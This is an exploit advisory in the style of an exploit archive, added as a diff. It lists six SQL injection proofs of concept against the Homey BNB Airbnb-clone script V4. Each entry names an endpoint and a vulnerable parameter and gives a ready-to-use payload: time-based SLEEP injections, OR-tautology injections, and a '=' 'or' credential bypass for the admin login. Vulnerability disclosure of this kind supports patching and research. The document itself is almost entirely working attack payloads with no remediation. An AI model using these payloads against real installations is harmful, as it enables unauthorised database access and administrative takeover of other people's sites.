@@ -1,0 +1,48 @@
+# Exploit Title: Homey BNB (Airbnb Clone Script) - Multiple SQL Injection
+# Date: 27.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.doditsolutions.com/airbnb-clone-script/
+# Demo Site: http://sitedemos.in/homeybnb/
+# Version: V4
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/rooms/ajax_refresh_subtotal
+Vulnerable Parameter: hosting_id (GET)
+Payload: checkin=mm/dd/yy&checkout=mm/dd/yy&hosting_id=1' AND SLEEP(5)--
+DXVl&number_of_guests=1
+
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/admin/edit.php?id=1
+Vulnerable Parameter: id (GET)
+Payload: id=if(now()=sysdate()%2Csleep(0)%2C0)
+
+
+----- PoC 3: SQLi -----
+
+Request: http://localhost/[PATH]/admin/cms_getpagetitle.php?catid=1
+Vulnerable Parameter: catid (GET)
+Payload: catid=-1'%20OR%203*2*1=6%20AND%20000640=000640%20--%20
+
+
+----- PoC 4: SQLi -----
+
+Request: http://localhost/[PATH]/admin/getcmsdata.php?pt=1
+Vulnerable Parameter: pt (GET)
+Payload: pt=-1'%20OR%203*2*1=6%20AND%20000929=000929%20--%20
+
+----- PoC 5: SQLi -----
+
+Request: http://localhost/[PATH]/admin/getrecord.php?val=1
+Vulnerable Parameter: val (GET)
+Payload: val=-1'%20OR%203*2*1=6%20AND%20000886=000886%20--%20
+
+----- PoC 6: SQLi (Authentication Bypass -----
+
+Administration Panel: http://localhost/[PATH]/admin/
+Username: '=' 'or'
+Password: '=' 'or'
